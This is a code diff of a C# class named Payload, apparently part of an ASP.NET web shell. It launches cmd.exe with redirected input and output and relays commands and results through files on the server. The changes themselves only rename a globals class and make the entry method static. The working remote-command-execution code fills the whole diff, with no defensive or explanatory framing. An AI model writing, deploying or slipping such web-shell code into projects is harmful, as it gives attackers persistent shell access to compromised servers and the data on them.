@@ -8,10 +8,10 @@ using System.Diagnostics;
 
 public class Payload
 {
-    public string Run()
+    public static string run()
     {
         HttpContext.Current.Server.ScriptTimeout = 3600;
-        Directory.SetCurrentDirectory(Global.pwd);
+        Directory.SetCurrentDirectory(Globals.pwd);
         return shell();
     }
 
@@ -23,9 +23,9 @@ public class Payload
         pinfo.RedirectStandardOutput = true;
         pinfo.RedirectStandardInput = true;
         pinfo.UseShellExecute = false;
-        pinfo.WorkingDirectory = Global.pwd;
+        pinfo.WorkingDirectory = Globals.pwd;
         pinfo.FileName = "cmd.exe";
-        pinfo.Arguments = "/c " + Global.shell;
+        pinfo.Arguments = "/c " + Globals.shell;
         try
         {
             p.Start();
@@ -36,17 +36,17 @@ public class Payload
         }
         StreamWriter writer = p.StandardInput;
         StreamReader out_reader = p.StandardOutput;
-        using (FileStream t1 = File.Create(Global.infile)) ;
-        using (FileStream t2 = File.Create(Global.outfile)) ;
+        using (FileStream t1 = File.Create(Globals.infile)) ;
+        using (FileStream t2 = File.Create(Globals.outfile)) ;
         Thread read_thread = new Thread(Payload.ReadToFile);
         read_thread.Start(new Tuple<StreamReader, Process>(out_reader, p));
-        while (!p.HasExited && File.Exists(Global.infile) && File.Exists(Global.outfile))
+        while (!p.HasExited && File.Exists(Globals.infile) && File.Exists(Globals.outfile))
         {
             String cmd = "";
             mut.WaitOne();
             try{
-                cmd = File.ReadAllText(Global.infile);
-                File.WriteAllText(Global.infile, "");
+                cmd = File.ReadAllText(Globals.infile);
+                File.WriteAllText(Globals.infile, "");
             }catch(Exception){break;}finally{
                 mut.ReleaseMutex();
             }
@@ -75,7 +75,7 @@ public class Payload
         StreamReader reader = tmp.Item1;
         Process p = tmp.Item2;
         Mutex mut = new Mutex(false, "test123");
-        while (!p.HasExited && File.Exists(Global.infile) && File.Exists(Global.outfile))
+        while (!p.HasExited && File.Exists(Globals.infile) && File.Exists(Globals.outfile))
         {
             char[] buf = new char[4096];
             reader.Read(buf, 0, 4096);
@@ -84,7 +84,7 @@ public class Payload
             if (s != "")
             {
                 mut.WaitOne();
-                File.AppendAllText(Global.outfile, s);
+                File.AppendAllText(Globals.outfile, s);
                 mut.ReleaseMutex();
             }
         }
